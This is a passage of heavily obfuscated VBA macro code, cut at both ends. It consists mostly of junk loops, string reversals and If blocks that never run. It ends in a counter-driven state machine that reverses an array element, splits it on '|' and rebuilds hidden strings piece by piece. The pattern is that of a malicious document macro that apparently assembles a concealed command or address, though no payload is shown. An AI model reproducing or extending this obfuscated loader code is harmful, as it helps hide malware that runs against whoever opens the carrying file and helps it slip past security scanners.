                If 1662987 = 150 - 2081 Then
            TPjYJ = Replace("onOnvDvbjiiITE", "onO", "JXXl")
            TPjYJ = StrReverse("onOnvDvbjiiITE")
            End If
        OAUr = Replace("FEmlgLClED", "FEm", "mFDhXfR")
                If 3317162 = 56 - 2834 Then
            gIlgJ = Replace("aGkcmKDPQaQdSgkrrJ", "aGk", "xEWoez")
            gIlgJ = StrReverse("aGkcmKDPQaQdSgkrrJ")
            BGwKA = Replace("sfObWdCaFHwEU", "sfO", "FGuxhu")
            BGwKA = StrReverse("sfObWdCaFHwEU")
            End If
    Next IwsiE
    If 2535458 = 132 - 6001 Then
        Mvyae = Replace("JaBXRWgdjgZMy", "JaBX", "LPllRtb")
        Mvyae = StrReverse("JaBXRWgdjgZMy")
        tHHwH = Replace("sfWWmKcEatfWIWaWkji", "sfWW", "uoRF")
        tHHwH = StrReverse("sfWWmKcEatfWIWaWkji")
        End If
    For rgqBC = 0 To 351
        rLBU = Replace("vpliOuhQnoUXkecgZT", "vpl", "ZOHLIz")
        rLBU = Replace("pxemgEhOPycMm", "pxem", "OWbdWE")
        rLBU = Replace("FevtutIbyuBbqqE", "Fevt", "bRcwkC")
        rLBU = Replace("TstUdSCYKsEYUjJj", "Tst", "yItst")
        rLBU = StrReverse("shTyzZZZKvACjcUhI")
        rLBU = StrReverse("GVUJxSCeJUZkVixWUIM")
        rLBU = Replace("KveDbgtmJSDzEP", "Kve", "BclSB")
                If 105805 = 258 - 1302 Then
            AyOne = Replace("tGHJtSZSdWBkxujK", "tGHJ", "vyth")
            AyOne = StrReverse("tGHJtSZSdWBkxujK")
            End If
        rLBU = StrReverse("ZFFLFUTLltxAAunBGwL")
                If 1729583 = 170 - 1842 Then
            DFWZE = Replace("PauvojqlHui", "Pauv", "Gdgr")
            DFWZE = StrReverse("PauvojqlHui")
            xiqxh = Replace("RoOKabrZUXJxCHA", "RoOK", "qngxac")
            xiqxh = StrReverse("RoOKabrZUXJxCHA")
            End If
        rLBU = Replace("CIkjLbCpFJuquDhn", "CIkj", "dBQVIu")
        rLBU = Replace("uGbEukWvRmcmjrBuB", "uGbE", "oboZTQL")
        rLBU = Replace("iRtZrILWDmyiAw", "iRtZ", "TSCm")
        rLBU = StrReverse("udAOtPkgOwL")
        rLBU = Replace("CtdLShOJMnooYwZxl", "CtdL", "pUyJPhM")
        rLBU = StrReverse("SzzmynTLUS")
        rLBU = StrReverse("UHhMMDriyEgiSnpDV")
                If 1501303 = 232 - 2124 Then
            Hxxkk = Replace("uYZWpSdFEpjfibk", "uYZW", "cbYmYK")
            Hxxkk = StrReverse("uYZWpSdFEpjfibk")
            wkkXw = Replace("yBpVMJFWRUwJP", "yBpV", "WwezCLw")
            wkkXw = StrReverse("yBpVMJFWRUwJP")
            End If
        rLBU = StrReverse("bCbhQoRTfrnP")
        rLBU = StrReverse("OZeBdECuJiMpvQ")
        rLBU = Replace("pJyvOOvCTqJPpbosE", "pJy", "BmKfh")
        rLBU = Replace("wPUytswXBXCqTSjann", "wPU", "UOGSvpt")
        rLBU = StrReverse("IpneKEGhwrguLA")
        rLBU = Replace("BfYVsBdRfPL", "BfY", "KOtC")
        rLBU = Replace("FlAFDDcIbyfRvW", "FlAF", "wMXkKB")
    Next rgqBC
    For qCAfY = 0 To 346
                If 191829 = 247 - 5888 Then
            TJrsF = Replace("pSCxVYBwPofsxJYtWdH", "pSCx", "tVyvlUs")
            TJrsF = StrReverse("pSCxVYBwPofsxJYtWdH")
            End If
        ACqz = StrReverse("DmHrHgUeGmx")
        ACqz = Replace("ZZoovPnMHaxbHleqPS", "ZZoo", "naIPF")
                If 2819107 = 106 - 2165 Then
            bTvwb = Replace("yfapzoOrKAXLCLWXt", "yfa", "mWwrL")
            bTvwb = StrReverse("yfapzoOrKAXLCLWXt")
            qqlhs = Replace("qcxUoSjQfMzozWI", "qcxU", "YpXXEDe")
            qqlhs = StrReverse("qcxUoSjQfMzozWI")
            End If
        ACqz = StrReverse("KojxnIAdfFF")
                If 2036286 = 256 - 5954 Then
            Atcgi = Replace("vrmgxwQrea", "vrm", "tHCC")
            Atcgi = StrReverse("vrmgxwQrea")
            End If
        ACqz = Replace("VLjBunBolDJGvQD", "VLjB", "FdOys")
        ACqz = Replace("HVyKIGGORzpiT", "HVy", "SghZL")
        ACqz = Replace("IdHihhPyXAhsDQ", "IdHi", "oQtFZG")
        ACqz = Replace("ZqqbqlSiBLpbm", "Zqqb", "rnokQ")
        ACqz = StrReverse("YlrHtAyecXYvw")
        ACqz = StrReverse("UsRKjlUxWDBwY")
        ACqz = Replace("iRkQtmiAnZH", "iRk", "mExaWUW")
                If 525996 = 150 - 28 Then
            VQxEz = Replace("lGLdGdIYVufYTQtS", "lGL", "CYAZPDY")
            VQxEz = StrReverse("lGLdGdIYVufYTQtS")
            End If
        ACqz = Replace("cqYKpbVomPDikLPJEFE", "cqY", "flbpxzJ")
        ACqz = Replace("tQmAqPtGfyCWvPbfKmk", "tQmA", "eYaFm")
        ACqz = StrReverse("uLvrVLLTCgdTqsd")
        ACqz = StrReverse("KbpQWVfsYDmBS")
        ACqz = StrReverse("UwEJkixDtBsMRGy")
        ACqz = StrReverse("zugxrEnCZbjn")
                If 1913113 = 184 - 2755 Then
            nHZyr = Replace("uYurCrgPDjsoPDiCf", "uYur", "HPiL")
            nHZyr = StrReverse("uYurCrgPDjsoPDiCf")
            VPmDu = Replace("bWrrGhFCkjiIua", "bWr", "xJsnCij")
            VPmDu = StrReverse("bWrrGhFCkjiIua")
            End If
        ACqz = StrReverse("xdDYrpxQrs")
        ACqz = Replace("SxaOnMSxRPHtDS", "SxaO", "xFTs")
        ACqz = Replace("DbKFxdCkytbPXYnKkb", "DbK", "geamvKI")
        ACqz = Replace("YuVUyRwHfqutkBOuY", "YuVU", "CTudJ")
    Next qCAfY
    If 670745 = 101 - 1389 Then
        SOvCR = Replace("DwnZLdLgJqog", "DwnZ", "ShXVl")
        SOvCR = StrReverse("DwnZLdLgJqog")
        End If
    If 3327136 = 54 - 6999 Then
        dQPEs = Replace("ywgqwxcBRLRbdOn", "ywgq", "RehcBUL")
        dQPEs = StrReverse("ywgqwxcBRLRbdOn")
        fDFRv = Replace("oBPqklXyFo", "oBPq", "TYcvn")
        fDFRv = StrReverse("oBPqklXyFo")
        End If
    For JfCJV = 0 To 93
        vIqg = Replace("lKOlkeBoIFA", "lKOl", "EjMdJg")
        vIqg = Replace("oLhZVpYlSGCXFcon", "oLhZ", "gnpY")
        vIqg = Replace("LatGkuossZnBpL", "LatG", "RYDs")
        vIqg = StrReverse("xgROukPOruxygLbOgP")
        vIqg = Replace("ODEsDIvVvaCJLyB", "ODEs", "dBdQ")
        vIqg = Replace("MguunHTTLUtSaJjL", "Mguu", "CdBxhDi")
        vIqg = StrReverse("vvsKjSwcikS")
                If 151593 = 1 - 222 Then
            MCIyI = Replace("kBFWxKtzPLonUpjuEq", "kBF", "lHyndU")
            MCIyI = StrReverse("kBFWxKtzPLonUpjuEq")
            xJpol = Replace("MahHVGVPbEdVJfViJ", "MahH", "mlMDvLm")
            xJpol = StrReverse("MahHVGVPbEdVJfViJ")
            End If
        vIqg = Replace("ugxaFmQefKFAcpnV", "ugxa", "UQTlc")
        vIqg = StrReverse("OoKGRfiGgoxfaPSApa")
        vIqg = StrReverse("IzYyagZnAoiLFnPsg")
        vIqg = Replace("lwaovfxHbolbBa", "lwao", "piAqz")
                If 247312 = 252 - 4727 Then
            ajFun = Replace("ileWjvufXrhYynKnctg", "ileW", "SnRhm")
            ajFun = StrReverse("ileWjvufXrhYynKnctg")
            nOcFy = Replace("hheOloPOlOOwunv", "hhe", "drrl")
            nOcFy = StrReverse("hheOloPOlOOwunv")
            End If
        vIqg = Replace("qFRLyshqqfWACF", "qFRL", "VEmXA")
                If 516896 = 64 - 5649 Then
            IgtOV = Replace("bvBuDpifEdUZxq", "bvBu", "VHUcWGn")
            IgtOV = StrReverse("bvBuDpifEdUZxq")
            SBtlQ = Replace("JojVZboMlw", "JojV", "DcbO")
            SBtlQ = StrReverse("JojVZboMlw")
            End If
        vIqg = StrReverse("ETgqcRisgd")
        vIqg = Replace("KZqvTmFvEMXzoSkvb", "KZqv", "iWqede")
        vIqg = Replace("hxvmkYLrwnEUusQRTEo", "hxv", "oUcUr")
        vIqg = StrReverse("xxfmgrOKgVSTgOUYmPI")
                If 2376232 = 162 - 3622 Then
            dLWtd = Replace("RyjkbTUiWrAKGdUL", "Ryj", "jbIFk")
            dLWtd = StrReverse("RyjkbTUiWrAKGdUL")
            XUJBM = Replace("uvibaFrBWnxFz", "uvib", "CUBuDFh")
            XUJBM = StrReverse("uvibaFrBWnxFz")
            End If
        vIqg = StrReverse("OVbpiwXKvQ")
        vIqg = StrReverse("srDaOMwZPhWKYd")
        vIqg = Replace("CnYKoJipcklHiKPWA", "CnYK", "aMpvcq")
        vIqg = StrReverse("EtMcjBrtKQ")
        vIqg = Replace("yUHCUltBFBFUwqYG", "yUH", "BRaUuXa")
    Next JfCJV
    For RVRTK = 0 To 165
        ZWut = StrReverse("DfVeAbSZzOfuv")
                If 1626815 = 229 - 1177 Then
            ztDGY = Replace("LXeWmgAKXZtKzKZLI", "LXe", "rtkwYal")
            ztDGY = StrReverse("LXeWmgAKXZtKzKZLI")
            xmpza = Replace("rffduOobczo", "rffd", "tOyg")
            xmpza = StrReverse("rffduOobczo")
            End If
        ZWut = StrReverse("IgtjPmEceY")
        ZWut = Replace("rZoQVsYpDAij", "rZo", "IxHJXC")
        ZWut = Replace("txpVuyRMEpVbKWYRqXR", "txp", "Ictrrh")
        ZWut = Replace("yqxSMuEmDRup", "yqx", "sGpO")
        ZWut = Replace("omfISuJVwhpFoQnB", "omf", "pjuSlKr")
        ZWut = StrReverse("dARjmsglxTUr")
        ZWut = Replace("rQrmGwRoerTCcGxBl", "rQr", "mausx")
        ZWut = Replace("BufACgOUtvzgys", "BufA", "CCRVyp")
        ZWut = StrReverse("ArVMVFMbzCHrdpF")
        ZWut = Replace("YtFTzSZsrZWhwD", "YtFT", "riLRkC")
        ZWut = StrReverse("phtkIZEwPxbpdYGD")
        ZWut = StrReverse("vEllaRPOFCjIHUVFPQw")
        ZWut = Replace("itEBJMqQMItxQF", "itEB", "TlAyeRi")
        ZWut = Replace("PDSLsZzjFY", "PDS", "ELiiFcY")
        ZWut = Replace("VkEXrXHscyvLJE", "VkEX", "ILgSAHx")
                If 2920713 = 42 - 2359 Then
            MDHnA = Replace("cHkJEWbyugBHd", "cHk", "zipW")
            MDHnA = StrReverse("cHkJEWbyugBHd")
            End If
                If 3846529 = 103 - 7429 Then
            IduBU = Replace("qicsbcZFJVWW", "qics", "MGPD")
            IduBU = StrReverse("qicsbcZFJVWW")
            End If
                If 2372410 = 114 - 7133 Then
            GZHWY = Replace("beMpCJaTKiZ", "beM", "yJwUG")
            GZHWY = StrReverse("beMpCJaTKiZ")
            End If
        ZWut = Replace("uQEYtdrkQlDROrjFzu", "uQE", "YIwU")
        ZWut = Replace("WzEgEjrTpSi", "WzEg", "RJMSn")
        ZWut = Replace("VAQbkzpRFY", "VAQb", "Cfur")
        ZWut = StrReverse("rAqtCkxieUeRUv")
        ZWut = Replace("TqZJbWDRaE", "TqZJ", "XFwRXz")
    Next RVRTK
    For rqTLQ = 0 To 376
        iOvX = StrReverse("CWGhDfevEdpR")
        iOvX = StrReverse("HroFxowerWpUL")
        iOvX = StrReverse("kvaBzEHtqZLqZyRhK")
        iOvX = Replace("RyKEROsXcrR", "RyKE", "FzMKB")
        iOvX = Replace("bugkZbBmHkZJ", "bugk", "rjpdic")
                If 810448 = 101 - 7654 Then
            qssyk = Replace("IkMmEOwOdtVwueTRF", "IkM", "rytX")
            qssyk = StrReverse("IkMmEOwOdtVwueTRF")
            End If
        iOvX = StrReverse("zRVhjUjznlFeDsm")
        iOvX = Replace("AGmMVtRsiPVbYQujZH", "AGmM", "HyyB")
        iOvX = Replace("BZkkmzEJMcXrbrdHar", "BZkk", "nLfD")
        iOvX = Replace("YKALComZTy", "YKAL", "xnMuqk")
        iOvX = Replace("KaJckPrWqTBmLEf", "KaJc", "WKCr")
        iOvX = Replace("soFZHMYWYzRMa", "soFZ", "wAoiuYU")
        iOvX = StrReverse("UQZLczxoerzHP")
                If 3465737 = 144 - 1478 Then
            JlxOO = Replace("qjrJEfTszvccHD", "qjr", "BpDw")
            JlxOO = StrReverse("qjrJEfTszvccHD")
            HbQZR = Replace("QUasnBuEELXZ", "QUas", "QkbU")
            HbQZR = StrReverse("QUasnBuEELXZ")
            End If
        iOvX = Replace("ZaCpaOzFab", "ZaC", "rdYHnf")
        iOvX = StrReverse("KQpYqzPGiClVuV")
                If 19368 = 26 - 4533 Then
            SDqJp = Replace("EIEBzADpsllyK", "EIE", "atEz")
            SDqJp = StrReverse("EIEBzADpsllyK")
            End If
        iOvX = Replace("UvtlgFIfoSDjaTqQL", "Uvtl", "DEdh")
                If 3167713 = 49 - 8035 Then
            hVbae = Replace("PSMMLbwOETmlJwbT", "PSMM", "RhKlW")
            hVbae = StrReverse("PSMMLbwOETmlJwbT")
            End If
        iOvX = Replace("oLGndGzwPmJpYkFVuv", "oLG", "bBLdUye")
        iOvX = StrReverse("aLpHbkAvDbnCpmHCO")
        iOvX = Replace("xniKHFpATbbcZuCBc", "xniK", "gZHs")
        iOvX = Replace("nFrihTCukUi", "nFr", "GHLTa")
        iOvX = StrReverse("mFToQvlKvl")
        iOvX = StrReverse("wxhHQFEsUkzgic")
    Next rqTLQ
CKXAYp = Replace("vHRukkbrftQIWHIg", "vHR", "Rtes")
    For QbfWQ = 0 To 139
        tJyH = StrReverse("TwSufsuWYmRQa")
        tJyH = StrReverse("hUntYAIFYwe")
        tJyH = Replace("JDoSjCASsvlyYGdz", "JDo", "Cjgr")
        tJyH = StrReverse("dpkjaCXelSqmdIzks")
                If 2341939 = 26 - 7377 Then
            dSXgv = Replace("FHLqghnBmqycaIbVL", "FHLq", "LVpfRr")
            dSXgv = StrReverse("FHLqghnBmqycaIbVL")
            HnUdc = Replace("nXVrXWVmGIDtfLpu", "nXV", "JPhe")
            HnUdc = StrReverse("nXVrXWVmGIDtfLpu")
            End If
        tJyH = StrReverse("pHgRXrzzAfvXdYQHmQL")
        tJyH = Replace("HYqeVwlkSPhegwlHY", "HYq", "mcHG")
                If 1524668 = 5 - 4961 Then
            BGiux = Replace("gXLTmjKyznHmVeov", "gXLT", "lFixr")
            BGiux = StrReverse("gXLTmjKyznHmVeov")
            End If
        tJyH = Replace("CKOqrbvHYOS", "CKOq", "lvBaO")
        tJyH = StrReverse("vVOZsnWfuenpT")
        tJyH = Replace("jmYtrYfsITxgYe", "jmY", "gkRwA")
        tJyH = Replace("AJBylCFIxKttSo", "AJB", "ztjZciZ")
        tJyH = StrReverse("UxbleeHzpUFhyF")
        tJyH = StrReverse("XcBuwwJSPYSPQFSctES")
        tJyH = StrReverse("AugGgxuYIYhqFm")
        tJyH = Replace("JZdSzUWCRUjzlf", "JZdS", "pYmx")
        tJyH = Replace("MHoWurYOVCVKeMvSk", "MHoW", "UHaDhXz")
        tJyH = StrReverse("mSRKSvlgcFhjcGu")
        tJyH = Replace("xIjaRbHDhXIqfSAvuqk", "xIja", "abhwGm")
        tJyH = StrReverse("IUCOFLPBTobxK")
        tJyH = Replace("GsjhddCPacP", "Gsj", "QSvoy")
        tJyH = StrReverse("oyOHyTgVpLZikjOCDPr")
        tJyH = StrReverse("SdenQiIWxmaymQuVW")
        tJyH = Replace("fcngXGFGwxUvtupzhll", "fcng", "nksPZ")
        tJyH = Replace("QIpPaUdVhzWXb", "QIpP", "ROoCoHi")
    Next QbfWQ
    For yRHzS = 0 To 117
        UcfL = StrReverse("kDyrhIEVkeHbBQILdDM")
        UcfL = StrReverse("aIrOOIIlKYJbk")
                If 1602905 = 93 - 336 Then
            RGArJ = Replace("kdHzLwpOSyEGnpXf", "kdHz", "gjhzm")
            RGArJ = StrReverse("kdHzLwpOSyEGnpXf")
            End If
                If 586060 = 124 - 8038 Then
            nAYPI = Replace("QfxDJJwmCRBJJZo", "Qfx", "JnOhE")
            nAYPI = StrReverse("QfxDJJwmCRBJJZo")
            IGKPO = Replace("vxpHucoQncOSq", "vxpH", "OHAjx")
            IGKPO = StrReverse("vxpHucoQncOSq")
            End If
        UcfL = StrReverse("CQxAXMwBqMPD")
                If 2598087 = 35 - 1867 Then
            RPwsf = Replace("hqIfpSTWFsuOh", "hqIf", "QdoWs")
            RPwsf = StrReverse("hqIfpSTWFsuOh")
            DjStU = Replace("tsYDJGCaHrdW", "tsY", "qbfHp")
            DjStU = StrReverse("tsYDJGCaHrdW")
            End If
        UcfL = StrReverse("iolGfqHFQJneykU")
                If 1955337 = 88 - 5185 Then
            vQdVB = Replace("TiVOpUKsAM", "TiV", "ioVJZ")
            vQdVB = StrReverse("TiVOpUKsAM")
            TXyjQ = Replace("KtBqiHKIEzDYicmfzxK", "KtB", "AjsS")
            TXyjQ = StrReverse("KtBqiHKIEzDYicmfzxK")
            End If
        UcfL = Replace("KdRdUxwJVLPWcMKmU", "KdR", "RnGJfL")
        UcfL = StrReverse("thCmiwheXuqmfAclaWX")
        UcfL = Replace("ZEobAEpirafIRiDifL", "ZEob", "QkquZ")
                If 1531256 = 249 - 5065 Then
            koOEj = Replace("JvlSxrORXqFkAFa", "JvlS", "avvQBa")
            koOEj = StrReverse("JvlSxrORXqFkAFa")
            End If
        UcfL = Replace("cZgXFcRJDZgkbtmgVpX", "cZgX", "JJwLlue")
        UcfL = Replace("zsXihKTGUvYFG", "zsX", "QXatrXg")
                If 2596039 = 21 - 5877 Then
            vKGFC = Replace("yZdwbdMAxLIxU", "yZd", "Wpvo")
            vKGFC = StrReverse("yZdwbdMAxLIxU")
            End If
        UcfL = StrReverse("oDdEkRdQdwLf")
        UcfL = StrReverse("hQouusYzWySB")
        UcfL = StrReverse("aQvpZQiAIOX")
        UcfL = StrReverse("KGqyzdsPRpeVfwi")
        UcfL = Replace("foGAZznkjiSjXQ", "foG", "yOqoql")
        UcfL = Replace("MaJpFVsMys", "MaJp", "dLhefPT")
        UcfL = StrReverse("wtUDZwqssxcrs")
        UcfL = Replace("WFvBDXzOYtpbam", "WFvB", "WVJxKq")
        UcfL = Replace("DqurpbdeVVkyeSFh", "Dqur", "IbLQ")
        UcfL = StrReverse("jutvhtgTqWjhjySkpF")
    Next yRHzS
    For ErbTV = 0 To 262
        zVBi = StrReverse("HWtsoGHJLxxAgps")
        zVBi = Replace("QGxoCKRwWhahtOrWkUR", "QGxo", "sMbWkxX")
        zVBi = Replace("QsWlAtoKnPZlCQDaP", "QsW", "bTZJsA")
        zVBi = Replace("GLhhaJIoEXQDS", "GLhh", "PPxTMtz")
        zVBi = Replace("IYgzAIRVoel", "IYg", "ddJMekG")
        zVBi = Replace("CLgGRPOpCrFWGUi", "CLgG", "COJRy")
        zVBi = Replace("ftUXLvypiQH", "ftUX", "EKYT")
                If 714984 = 196 - 6773 Then
            ExDmW = Replace("ztsgkclByyu", "zts", "RHhTxD")
            ExDmW = StrReverse("ztsgkclByyu")
            eqRVo = Replace("aTkqDxwCoDwIvfaGQWo", "aTkq", "aGah")
            eqRVo = StrReverse("aTkqDxwCoDwIvfaGQWo")
            End If
        zVBi = Replace("QjaHkmibCcPzFJyvxwX", "QjaH", "HHGG")
        zVBi = StrReverse("mXnYzeUaCjtT")
        zVBi = StrReverse("aluAYdKHMhK")
        zVBi = Replace("wdSFcsJwktexO", "wdS", "aZlG")
        zVBi = StrReverse("alSyYFXiPCk")
        zVBi = Replace("fwEcHnMWMnnELvlv", "fwE", "WDEarkd")
        zVBi = Replace("dQvBhYntAJVIY", "dQvB", "dfbW")
        zVBi = Replace("HicTnvUXgmy", "Hic", "dvVr")
        zVBi = StrReverse("QULXAOawRoOIIuk")
        zVBi = Replace("CViCMtrQTmMSrDzECj", "CVi", "wtdYZ")
        zVBi = StrReverse("mAPRfScvtSuGjZAq")
        zVBi = StrReverse("WDZgYWRiaxn")
        zVBi = StrReverse("qRzdHMyyrqSZqtPjOI")
        zVBi = StrReverse("JhWKiPZsIWczvozIoO")
        zVBi = StrReverse("fRwxgkCfKzK")
        zVBi = StrReverse("TPAXlsibknAq")
        zVBi = Replace("PwtHAdqwLCe", "PwtH", "SndYa")
    Next ErbTV
    For zFcWu = 0 To 134
        fwID = Replace("DfJZQcBoVawydJJUXMW", "DfJZ", "vIkfoFc")
        fwID = StrReverse("vViqxvahzV")
                If 484765 = 36 - 2197 Then
            AglqB = Replace("rXkrTHvPzICTzQiSRV", "rXk", "oBegpE")
            AglqB = StrReverse("rXkrTHvPzICTzQiSRV")
            End If
                If 1243491 = 177 - 1675 Then
            GqzSF = Replace("kwbMnZmjuhFxrtcc", "kwbM", "oAufDKW")
            GqzSF = StrReverse("kwbMnZmjuhFxrtcc")
            End If
        fwID = Replace("PduXsTBeJsLmfJD", "Pdu", "tjYYLfx")
        fwID = StrReverse("tdBMBgMcPOtsL")
        fwID = StrReverse("pzOEdUDxosirghr")
        fwID = StrReverse("WWyfDcmMgz")
        fwID = Replace("fhypzaohRbUT", "fhyp", "OfQtUKM")
                If 1470655 = 171 - 895 Then
            hkOCC = Replace("yRDTVUzRVK", "yRDT", "YhRnhv")
            hkOCC = StrReverse("yRDTVUzRVK")
            End If
        fwID = StrReverse("ADYwMPLrPTyjP")
        fwID = StrReverse("FjqjPnpDkC")
        fwID = Replace("rtClWavAfKjsGfWIzfI", "rtCl", "JXiCT")
                If 1533635 = 108 - 5568 Then
            ZcWOu = Replace("THJYqKaWzn", "THJ", "yxuypwg")
            ZcWOu = StrReverse("THJYqKaWzn")
            KiBCO = Replace("mnVmXOAayHy", "mnV", "iELAce")
            KiBCO = StrReverse("mnVmXOAayHy")
            End If
        fwID = Replace("AORKcvQmakRvskbOx", "AORK", "LqOzcQ")
        fwID = Replace("YdRkpEpFqtVDy", "YdRk", "nbKARiL")
                If 55602 = 206 - 2749 Then
            xoaes = Replace("zynoYSwdCEZImFYcX", "zyn", "GemV")
            xoaes = StrReverse("zynoYSwdCEZImFYcX")
            End If
        fwID = Replace("DnvkXCCkfZd", "Dnvk", "LGjgh")
        fwID = StrReverse("rSjjXqxfkEbBqARt")
        fwID = StrReverse("RuicBuiLItsVIDwdT")
                If 604093 = 236 - 141 Then
            Ueqlm = Replace("fvrmnBiPvTtkxMyqGH", "fvrm", "OuLfey")
            Ueqlm = StrReverse("fvrmnBiPvTtkxMyqGH")
            End If
                If 300573 = 127 - 1218 Then
            sebDV = Replace("RVeYsjjUDYXLJPzw", "RVeY", "iuFk")
            sebDV = StrReverse("RVeYsjjUDYXLJPzw")
            End If
        fwID = Replace("jZqxQJFqfKHLvgTOnJ", "jZqx", "zeBEOi")
                If 2710527 = 233 - 6539 Then
            jGQYo = Replace("bpfXeZlIon", "bpf", "kqRzaoc")
            jGQYo = StrReverse("bpfXeZlIon")
            CFUpA = Replace("RlhHlpotxzkiRm", "Rlh", "tAipKzc")
            CFUpA = StrReverse("RlhHlpotxzkiRm")
            End If
        fwID = StrReverse("TWaonMUEPtFzcbhXkz")
    Next zFcWu
qLrwzh = StrReverse("MdCenmGuXUMudruOIvA")
    If 1781189 = 191 - 2614 Then
        TOVgJ = Replace("cCGeepGOGbMQ", "cCG", "Epjwy")
        TOVgJ = StrReverse("cCGeepGOGbMQ")
        nsqXo = Replace("yFqorlAYJE", "yFq", "TBsdnG")
        nsqXo = StrReverse("yFqorlAYJE")
        End If
jsYasG = StrReverse("vdqAXSkbPuD")
    For sSMAR = 0 To 330
        Zzdx = Replace("fxOhnsSjbdijqkwWsGA", "fxOh", "EEeB")
        Zzdx = Replace("UehiuXOqcIefmAWyZUU", "Ueh", "mjaG")
        Zzdx = StrReverse("KkpqOCsfLphQx")
                If 3473659 = 22 - 2259 Then
            LVKXH = Replace("bpkZeBfGlVCw", "bpk", "ZEWS")
            LVKXH = StrReverse("bpkZeBfGlVCw")
            eBmWI = Replace("OYvSxtuXSuPvL", "OYv", "nUil")
            eBmWI = StrReverse("OYvSxtuXSuPvL")
            End If
        Zzdx = StrReverse("koocHZtavcwtGnj")
                If 3176204 = 202 - 8024 Then
            DStfi = Replace("rPygWmZAdQUtik", "rPyg", "taiQ")
            DStfi = StrReverse("rPygWmZAdQUtik")
            End If
        Zzdx = Replace("XsmdhrTkUsXl", "Xsmd", "RUXx")
        Zzdx = StrReverse("vnbGWnvHUCHxv")
        Zzdx = Replace("GoiaVjbHBxkJdbXVLCu", "Goi", "dtTIk")
        Zzdx = StrReverse("zUgqtdabbxsEvOFG")
        Zzdx = StrReverse("XTLYIdDbBcbATrhmkzP")
        Zzdx = Replace("DKcEImUvTKfFCKKXQ", "DKc", "EbARq")
        Zzdx = Replace("qnYARDwHCbeTcBLHIU", "qnYA", "KOXD")
                If 478636 = 241 - 5106 Then
            xWiwR = Replace("BxisfMdqRgHVkA", "Bxis", "Poaccmd")
            xWiwR = StrReverse("BxisfMdqRgHVkA")
            ZrkBO = Replace("roACFPPHAgm", "roA", "zeYy")
            ZrkBO = StrReverse("roACFPPHAgm")
            End If
        Zzdx = StrReverse("oTVhvjGawlJ")
        Zzdx = StrReverse("SdTFGrxFmUivit")
                If 3075129 = 49 - 6617 Then
            qVjnX = Replace("UOjkqvsdCCWpQJPUHyp", "UOj", "yBtb")
            qVjnX = StrReverse("UOjkqvsdCCWpQJPUHyp")
            KAeck = Replace("ijcJRqGyKbabftkWImh", "ijcJ", "Unwq")
            KAeck = StrReverse("ijcJRqGyKbabftkWImh")
            End If
        Zzdx = StrReverse("guILsXTdtGujuEHriE")
        Zzdx = StrReverse("iQSJxibPUx")
        Zzdx = StrReverse("vaoLCKsokQpqYeRkGZQ")
                If 211638 = 38 - 7717 Then
            SzltK = Replace("cDPWcGposy", "cDPW", "ZPVt")
            SzltK = StrReverse("cDPWcGposy")
            YYOMU = Replace("FMsDPJPnbpdUcUyRPwr", "FMsD", "QtjibGd")
            YYOMU = StrReverse("FMsDPJPnbpdUcUyRPwr")
            End If
        Zzdx = Replace("ajVKHAYBaZr", "ajV", "SuWEs")
                If 2639384 = 44 - 1095 Then
            KJRno = Replace("mjMJVaoBogLVyOJEAnd", "mjMJ", "YdOflG")
            KJRno = StrReverse("mjMJVaoBogLVyOJEAnd")
            End If
        Zzdx = StrReverse("WwLwaEiVennVwZ")
        Zzdx = StrReverse("DQabSHzPSwVcCJwQ")
    Next sSMAR

    While rnMi < 3425
        If rnMi = 82 Then
            FPjb = Replace("OSbHEVtjZj", "OSb", "kGhGP")
        ElseIf rnMi = 3248 Then
            anDU = Split(Replace(uVu, "ejeWy", "cEw"), Chr(121 + 3))(0)
        ElseIf rnMi = 3200 Then
            bQr = Split(Replace(uVu, "mCIvK", "yvu"), Chr(123 + 1))(3 - 2)
        ElseIf rnMi = 2010 Then
            FPjb = Replace("djSIhCbzJJ", "djS", "ITbcQ")
        ElseIf rnMi = 279 Then
            FPjb = Replace("rMhlGPJbVa", "rMh", "OekwS")
        ElseIf rnMi = 2149 Then
            FPjb = Replace("axxfurrEAO", "axx", "LhDZQ")
        ElseIf rnMi = 1000 Then
            FPjb = Replace("sXzxVRwYXg", "sXz", "ogKIV")
        ElseIf rnMi = 2465 Then
            FPjb = Replace("vGajCuJhOZ", "vGa", "erpnc")
        ElseIf rnMi = 2848 Then
            FPjb = Replace("RdEjRTaziK", "RdE", "BRwTO")
        ElseIf rnMi = 2683 Then
            FPjb = Replace("GHwOBXDToq", "GHw", "CQLyG")
        ElseIf rnMi = 3080 Then
            uVu = Replace(StrReverse(pAKEfogafk(1)), "ruggo", "CGr")
        ElseIf rnMi = 1444 Then
            FPjb = Replace("iYqbKmlyWF", "iYq", "zZDYW")
        ElseIf rnMi = 1205 Then
            FPjb = Replace("zkMrTPDbXL", "zkM", "QUQFA")
        ElseIf rnMi = 1851 Then
            FPjb = Replace("qKpfMdCHCM", "qKp", "ZClkG")
        ElseIf rnMi = 384 Then
            FPjb = Replace("GwpyVbOgfo", "Gwp", "akoal")
        ElseIf rnMi = 1335 Then
            FPjb = Replace("RlkFskCPUQ", "Rlk", "hnJnj")
        ElseIf rnMi = 3003 Then
            FPjb = Replace("TGkQeKFPAj", "TGk", "yEKEd")
        ElseIf rnMi = 2383 Then
            FPjb = Replace("sjIJKzmnpi", "sjI", "nPnsG")
        ElseIf rnMi = 2782 Then
            FPjb = Replace("ZEtPenCEdC", "ZEt", "FWyHk")
        ElseIf rnMi = 245 Then
            FPjb = Replace("jLIzywauPJ", "jLI", "HuDys")
        ElseIf rnMi = 432 Then
            FPjb = Replace("SpyxkgxiyU", "Spy", "tfZUA")
        ElseIf rnMi = 867 Then
            FPjb = Replace("OlSqhdOSyr", "OlS", "Zmtwd")
        ElseIf rnMi = 1560 Then
            FPjb = Replace("KzqxurZZtE", "Kzq", "yOdJL")
        ElseIf rnMi = 459 Then
            FPjb = Replace("JncWTRpmcq", "Jnc", "KvSha")
        ElseIf rnMi = 1617 Then
            FPjb = Replace("KVVHUKBcnx", "KVV", "TBOkP")
        ElseIf rnMi = 3139 Then
            rcHz = Split(Replace(uVu, "ACTtL", "ssw"), Chr(122 + 2))(3 - 1)
        ElseIf rnMi = 1527 Then
            FPjb = Replace("WpPkufkKOR", "WpP", "ycRdP")
        ElseIf rnMi = 3343 Then
            fCOY = Replace(nOrz, anDU, Chr(44 + 2))
        ElseIf rnMi = 685 Then
            FPjb = Replace("lgAZgkXCUj", "lgA", "BOOEJ")
        ElseIf rnMi = 141 Then
            FPjb = Replace("hzmIFBAoqL", "hzm", "nvSmD")
        ElseIf rnMi = 773 Then
            FPjb = Replace("ByIAuWimBn", "ByI", "hrACX")
